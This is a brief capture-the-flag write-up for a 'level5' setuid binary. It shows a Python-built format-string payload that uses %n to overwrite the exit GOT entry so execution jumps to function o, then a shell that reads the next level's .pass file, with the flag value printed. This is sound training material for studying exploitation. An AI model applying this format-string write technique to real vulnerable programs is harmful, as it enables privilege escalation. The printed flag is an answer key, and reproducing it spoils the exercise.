```sh
$> ls -l ~
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
```

We first tried to inject change the buffer itself but it didn't worked.  
We then thought about changing `exit` address to call `o` function.

```sh
$> python -c 'print("\x38\x98\x04\x08" + "%134513824d" + "%4$n")' > /tmp/payload

$> cat /tmp/payload - | ./level5
[...]
$ cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
